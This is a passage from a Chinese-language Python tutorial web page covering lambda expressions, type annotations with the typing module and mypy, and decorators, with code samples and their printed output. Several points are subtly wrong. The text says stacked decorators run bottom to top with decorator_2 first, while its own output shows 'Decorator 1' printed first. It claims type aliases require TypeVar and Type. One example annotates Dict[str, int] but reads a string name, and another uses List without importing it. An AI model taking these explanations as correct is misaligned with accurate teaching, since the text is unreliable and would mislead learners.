class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">result = reduce(<span class="keyword">lambda</span> x, y: x + y, numbers)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：15</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>lambda x, y: x + y</code>定义了一个累加操作的Lambda函数，<code>reduce()</code>将其应用于<code>numbers</code>列表中的元素，计算出所有元素的和。</p><h2 id="Lambda表达式与普通函数的比较"><a href="#Lambda表达式与普通函数的比较" class="headerlink" title="Lambda表达式与普通函数的比较"></a>Lambda表达式与普通函数的比较</h2><h3 id="定义简洁性"><a href="#定义简洁性" class="headerlink" title="定义简洁性"></a>定义简洁性</h3><p>Lambda表达式通常比普通函数定义更简洁，适用于简单的功能。普通函数定义通常需要更多的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lambda表达式</span></span><br><span class="line">add_lambda = <span class="keyword">lambda</span> x, y: x + y</span><br></pre></td></tr></table></figure><h3 id="功能限制"><a href="#功能限制" class="headerlink" title="功能限制"></a>功能限制</h3><p>Lambda表达式只能包含一个表达式，而普通函数可以包含多个语句。对于简单的操作，Lambda表达式可以使代码更简洁，但当逻辑较复杂时，普通函数会更加清晰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply</span>(<span class="params">x, y</span>):</span><br><span class="line">    result = x * y</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lambda表达式</span></span><br><span class="line">multiply_lambda = <span class="keyword">lambda</span> x, y: x * y  <span class="comment"># 只能包含一条表达式</span></span><br></pre></td></tr></table></figure><h3 id="可重用性"><a href="#可重用性" class="headerlink" title="可重用性"></a>可重用性</h3><p>普通函数通常有名称，可以在多个地方复用。Lambda表达式通常是一次性使用的匿名函数，不需要为它起名字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lambda表达式</span></span><br><span class="line">square_lambda = <span class="keyword">lambda</span> x: x * x</span><br></pre></td></tr></table></figure><h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><p>Lambda表达式的性能与普通函数相差无几。它的优势在于简洁性，对于简单的功能，Lambda表达式能让代码更紧凑。对于复杂的功能，仍然推荐使用普通函数。</p><h2 id="Lambda表达式的优缺点"><a href="#Lambda表达式的优缺点" class="headerlink" title="Lambda表达式的优缺点"></a>Lambda表达式的优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li><strong>简洁</strong>：Lambda表达式使代码更简洁，适用于定义简单的函数。</li><li><strong>方便</strong>：常用于需要传递函数的地方，如<code>map()</code>、<code>filter()</code>、<code>sorted()</code>等函数。</li><li><strong>匿名函数</strong>：不需要为简单的函数定义名字。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li><strong>功能限制</strong>：Lambda表达式只能包含一个表达式，无法包含复杂的逻辑或多条语句。</li><li><strong>可读性差</strong>：对于复杂的操作，Lambda表达式可能使代码难以理解，应避免过度使用。</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>Lambda表达式</strong>是Python中的匿名函数，可以简洁地定义简单的功能。</li><li><strong>应用场景</strong>：主要用于<code>map()</code>、<code>filter()</code>、<code>reduce()</code>等高阶函数中，快速定义操作。</li><li><strong>优缺点</strong>：Lambda表达式使代码更加简洁，但适用于简单任务，复杂任务仍然需要使用普通函数。</li></ul><hr><h1 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h1><h2 id="类型注解（Type-Annotation）"><a href="#类型注解（Type-Annotation）" class="headerlink" title="类型注解（Type Annotation）"></a>类型注解（Type Annotation）</h2><p>类型注解是Python的一项功能，允许开发者在代码中显式地指定函数参数和返回值的类型。类型注解本身不会影响程序的执行，它们主要用于提供额外的信息，帮助开发者理解代码的结构，同时可以通过静态类型检查工具（如<code>mypy</code>）来检查代码中的类型一致性。</p><p>类型注解是Python 3.5引入的特性，随着时间的发展，它逐渐成为开发人员提高代码可读性和可维护性的一项重要工具。</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="函数参数的类型注解"><a href="#函数参数的类型注解" class="headerlink" title="函数参数的类型注解"></a>函数参数的类型注解</h3><p>在函数定义中，可以使用冒号<code>:</code>后跟类型来为每个参数指定类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br></pre></td></tr></table></figure><p>在这个例子中，函数<code>add</code>接受两个<code>int</code>类型的参数，并返回一个<code>int</code>类型的结果。类型注解指定了<code>a</code>和<code>b</code>的类型是<code>int</code>，并且指定了返回值类型为<code>int</code>。</p><h3 id="变量的类型注解"><a href="#变量的类型注解" class="headerlink" title="变量的类型注解"></a>变量的类型注解</h3><p>Python也支持在变量声明时添加类型注解，虽然类型注解不会影响变量的实际行为，但它提供了对变量类型的提示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x: <span class="built_in">int</span> = <span class="number">5</span></span><br><span class="line">y: <span class="built_in">str</span> = <span class="string">&quot;Hello&quot;</span></span><br></pre></td></tr></table></figure><p>这里，<code>x</code>被注解为<code>int</code>类型，<code>y</code>被注解为<code>str</code>类型。这样做有助于提高代码的可读性，尤其是在较大的项目中，明确变量类型非常重要。</p><h3 id="复合类型注解"><a href="#复合类型注解" class="headerlink" title="复合类型注解"></a>复合类型注解</h3><p>对于更复杂的类型，可以使用Python的内建类型（如<code>List</code>、<code>Dict</code>、<code>Tuple</code>等）来进行注解。Python的<code>typing</code>模块提供了这些类型。</p><h4 id="列表的类型注解"><a href="#列表的类型注解" class="headerlink" title="列表的类型注解"></a>列表的类型注解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum_list</span>(<span class="params">numbers: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(numbers)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>numbers</code>被注解为一个<code>int</code>类型的列表，表示函数接受一个<code>int</code>类型的列表，并返回一个<code>int</code>类型的结果。</p><h4 id="字典的类型注解"><a href="#字典的类型注解" class="headerlink" title="字典的类型注解"></a>字典的类型注解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name_age</span>(<span class="params">person: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;person[<span class="string">&#x27;name&#x27;</span>]&#125;</span> is <span class="subst">&#123;person[<span class="string">&#x27;age&#x27;</span>]&#125;</span> years old&quot;</span></span><br></pre></td></tr></table></figure><p>此例中，<code>person</code>被注解为一个字典，字典的键是<code>str</code>类型，值是<code>int</code>类型。</p><h4 id="元组的类型注解"><a href="#元组的类型注解" class="headerlink" title="元组的类型注解"></a>元组的类型注解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coordinates</span>() -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">10</span>, <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>coordinates()</code>函数返回一个包含两个<code>int</code>类型值的元组。</p><h3 id="可选类型（Optional）"><a href="#可选类型（Optional）" class="headerlink" title="可选类型（Optional）"></a>可选类型（Optional）</h3><p>有时，函数的参数或返回值可能是某种类型，或者是<code>None</code>。这种情况下，可以使用<code>Optional</code>来表示这种可能性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_name</span>(<span class="params">names: <span class="type">List</span>[<span class="built_in">str</span>], name: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> names:</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>find_name</code>函数返回一个<code>str</code>类型的值，或者返回<code>None</code>。通过<code>Optional[str]</code>，我们明确了返回值的类型要么是<code>str</code>，要么是<code>None</code>。</p><h3 id="类型别名（Type-Aliases）"><a href="#类型别名（Type-Aliases）" class="headerlink" title="类型别名（Type Aliases）"></a>类型别名（Type Aliases）</h3><p>如果你想给复杂的类型定义一个别名，可以使用<code>TypeVar</code>和<code>Type</code>。这对于提高代码可读性非常有用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line">Point = <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]  <span class="comment"># 定义类型别名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">p1: Point, p2: Point</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    <span class="keyword">return</span> ((p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) ** <span class="number">2</span> + (p1[<span class="number">1</span>] - p2[<span class="number">1</span>]) ** <span class="number">2</span>) ** <span class="number">0.5</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Point</code>是<code>Tuple[int, int]</code>的类型别名，表示一个二维点的坐标。通过给类型创建别名，代码更简洁并且易于理解。</p><h3 id="联合类型（Union）"><a href="#联合类型（Union）" class="headerlink" title="联合类型（Union）"></a>联合类型（Union）</h3><p>有时，变量或者函数的返回值可能有多种类型。可以使用<code>Union</code>来表示一个类型可以是多个类型之一。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_value</span>(<span class="params">val: <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(val)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>val</code>的类型可能是<code>int</code>或<code>str</code>，通过<code>Union[int, str]</code>来表示这种可能性。</p><h3 id="类型推导与静态检查"><a href="#类型推导与静态检查" class="headerlink" title="类型推导与静态检查"></a>类型推导与静态检查</h3><p>尽管Python是动态类型语言，类型注解本身并不会影响程序的运行。Python的类型注解通常依赖于静态类型检查工具（如<code>mypy</code>）来进行验证。</p><h4 id="示例：使用mypy进行类型检查"><a href="#示例：使用mypy进行类型检查" class="headerlink" title="示例：使用mypy进行类型检查"></a>示例：使用<code>mypy</code>进行类型检查</h4><ol><li>首先，安装<code>mypy</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mypy</span><br></pre></td></tr></table></figure><ol start="2"><li>然后，你可以使用<code>mypy</code>来检查你的代码：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mypy your_script.py</span><br></pre></td></tr></table></figure><p><code>mypy</code>将根据类型注解检查你的代码是否存在类型不匹配的错误。</p><h2 id="类型注解的优势"><a href="#类型注解的优势" class="headerlink" title="类型注解的优势"></a>类型注解的优势</h2><h3 id="增强代码可读性"><a href="#增强代码可读性" class="headerlink" title="增强代码可读性"></a>增强代码可读性</h3><p>类型注解能够清楚地表明函数和变量的类型，使代码的意图更加明确，特别是在大型项目中，帮助开发者快速理解代码。</p><h3 id="提高代码质量"><a href="#提高代码质量" class="headerlink" title="提高代码质量"></a>提高代码质量</h3><p>类型注解可以让你在开发过程中提前发现一些潜在的类型错误。通过静态类型检查工具，开发者可以在程序运行之前发现类型不匹配的地方，避免因类型问题导致的运行时错误。</p><h3 id="增加开发效率"><a href="#增加开发效率" class="headerlink" title="增加开发效率"></a>增加开发效率</h3><p>当函数参数和返回值的类型明确时，IDE（集成开发环境）可以提供更好的自动补全、类型提示和错误检查，帮助开发者减少错误并提高开发效率。</p><h2 id="类型注解的限制"><a href="#类型注解的限制" class="headerlink" title="类型注解的限制"></a>类型注解的限制</h2><h3 id="1-类型注解并不强制执行"><a href="#1-类型注解并不强制执行" class="headerlink" title="1. 类型注解并不强制执行"></a>1. 类型注解并不强制执行</h3><p>Python的类型注解并不会强制执行类型检查。它们仅供开发者参考，或者通过静态类型检查工具（如<code>mypy</code>）来验证类型一致性。Python本身在运行时并不检查类型，因此程序在运行时不会因为类型错误而抛出异常。</p><h3 id="2-动态类型语言的灵活性丧失"><a href="#2-动态类型语言的灵活性丧失" class="headerlink" title="2. 动态类型语言的灵活性丧失"></a>2. 动态类型语言的灵活性丧失</h3><p>虽然类型注解提高了代码的可读性和可靠性，但它也减少了Python作为动态类型语言的灵活性。开发者在定义类型时需要更加严格地遵循规范，这在某些情况下可能会限制代码的灵活性。</p><hr><h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><h2 id="装饰器的概念"><a href="#装饰器的概念" class="headerlink" title="装饰器的概念"></a>装饰器的概念</h2><p>在Python中，**装饰器（Decorator）**是一个用于修改或扩展函数或方法功能的高级特性。装饰器本质上是一个函数，它接受一个函数作为输入，并返回一个新的函数。装饰器通常用于增加函数的功能，而无需修改原有的函数代码。</p><p>装饰器的核心思想是通过将额外的功能封装到一个装饰器函数中，来“装饰”原始函数，从而实现代码的复用和功能扩展。</p><h2 id="装饰器的基本语法"><a href="#装饰器的基本语法" class="headerlink" title="装饰器的基本语法"></a>装饰器的基本语法</h2><p>装饰器是一个函数，它接受一个函数作为参数，并返回一个新的函数。在Python中，可以通过<code>@</code>符号来使用装饰器，语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">function = decorator(function)</span><br></pre></td></tr></table></figure><h3 id="示例：最简单的装饰器"><a href="#示例：最简单的装饰器" class="headerlink" title="示例：最简单的装饰器"></a>示例：最简单的装饰器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Before function call.&quot;</span>)</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;After function call.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@simple_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line">say_hello()</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>simple_decorator</code>是一个装饰器，它接受一个函数<code>func</code>，并返回一个新的函数<code>wrapper</code>。<code>wrapper</code>在调用<code>func</code>之前和之后分别打印一些内容。当我们使用<code>@simple_decorator</code>语法时，<code>say_hello</code>函数被<code>simple_decorator</code>装饰，调用<code>say_hello()</code>时实际上会执行装饰器中的<code>wrapper</code>函数。</p><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before function call.</span><br><span class="line">Hello!</span><br><span class="line">After function call.</span><br></pre></td></tr></table></figure><h2 id="装饰器的应用"><a href="#装饰器的应用" class="headerlink" title="装饰器的应用"></a>装饰器的应用</h2><p>装饰器常用于多种场景，主要用于增强函数或方法的功能。常见的应用场景包括：</p><ol><li><strong>日志记录</strong>：在函数调用前后记录日志。</li><li><strong>权限检查</strong>：在执行函数之前检查用户权限。</li><li><strong>缓存</strong>：缓存函数的计算结果，避免重复计算。</li></ol><h3 id="示例：装饰器用于日志记录"><a href="#示例：装饰器用于日志记录" class="headerlink" title="示例：装饰器用于日志记录"></a>示例：装饰器用于日志记录</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">log_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Calling function <span class="subst">&#123;func.__name__&#125;</span> with arguments <span class="subst">&#123;args&#125;</span> and <span class="subst">&#123;kwargs&#125;</span>&quot;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Function <span class="subst">&#123;func.__name__&#125;</span> returned <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@log_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>log_decorator</code>是一个装饰器，它会在函数调用前打印函数名称、参数，以及函数执行后的返回值。装饰器<code>@log_decorator</code>装饰了<code>add</code>函数，使得每次调用<code>add</code>时都会执行日志记录。</p><h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Calling function add with arguments (2, 3) and &#123;&#125;</span><br><span class="line">Function add returned 5</span><br></pre></td></tr></table></figure><h2 id="带参数的装饰器"><a href="#带参数的装饰器" class="headerlink" title="带参数的装饰器"></a>带参数的装饰器</h2><p>有时，我们希望装饰器接受一些参数来定制装饰器的行为。在这种情况下，装饰器本身需要再嵌套一层函数，以便接收参数。</p><h3 id="示例：带参数的装饰器"><a href="#示例：带参数的装饰器" class="headerlink" title="示例：带参数的装饰器"></a>示例：带参数的装饰器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repeat_decorator</span>(<span class="params">times</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">func</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">                result = func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@repeat_decorator(<span class="params">times=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>repeat_decorator</code>是一个带参数的装饰器，它接受<code>times</code>作为参数，并将<code>func</code>执行指定的次数。在这个例子中，<code>greet(&quot;Alice&quot;)</code>会打印三次<code>Hello, Alice!</code>。</p><h3 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, Alice!</span><br><span class="line">Hello, Alice!</span><br><span class="line">Hello, Alice!</span><br></pre></td></tr></table></figure><h2 id="装饰器与函数参数"><a href="#装饰器与函数参数" class="headerlink" title="装饰器与函数参数"></a>装饰器与函数参数</h2><p>装饰器通常是为了包装原始函数，但如果函数有参数，我们也可以使用<code>*args</code>和<code>**kwargs</code>来确保装饰器适用于任何参数类型的函数。</p><h3 id="示例：装饰器与函数参数"><a href="#示例：装饰器与函数参数" class="headerlink" title="示例：装饰器与函数参数"></a>示例：装饰器与函数参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Before function call&quot;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;After function call&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@greet_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name, age</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>, you are <span class="subst">&#123;age&#125;</span> years old.&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>greet</code>函数接受两个参数<code>name</code>和<code>age</code>，<code>greet_decorator</code>装饰器通过<code>*args</code>和<code>**kwargs</code>处理这些参数。</p><h3 id="输出：-3"><a href="#输出：-3" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before function call</span><br><span class="line">Hello Alice, you are 30 years old.</span><br><span class="line">After function call</span><br></pre></td></tr></table></figure><h2 id="装饰器的嵌套使用"><a href="#装饰器的嵌套使用" class="headerlink" title="装饰器的嵌套使用"></a>装饰器的嵌套使用</h2><p>多个装饰器可以同时应用于一个函数，装饰器按照从下到上的顺序执行。</p><h3 id="示例：多个装饰器"><a href="#示例：多个装饰器" class="headerlink" title="示例：多个装饰器"></a>示例：多个装饰器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_1</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decorator 1&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_2</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decorator 2&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorator_1</span></span><br><span class="line"><span class="meta">@decorator_2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line">say_hello()</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>say_hello</code>函数被两个装饰器装饰。装饰器的执行顺序是从下到上，因此<code>decorator_2</code>先执行，然后是<code>decorator_1</code>。</p><h3 id="输出：-4"><a href="#输出：-4" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Decorator 1</span><br><span class="line">Decorator 2</span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure><h2 id="functools-wraps：保留原函数的元数据"><a href="#functools-wraps：保留原函数的元数据" class="headerlink" 